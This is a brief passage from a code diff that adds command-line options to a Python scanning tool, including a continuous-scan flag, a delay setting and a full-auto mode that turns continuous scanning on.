+        help="Continuously scan the target"
+    )
+    scan_group.add_argument(
+        "--delay", 
+        type=int, 
+        default=2,
     # Full auto mode implications
     if args.full_auto:
         args.continuous = True
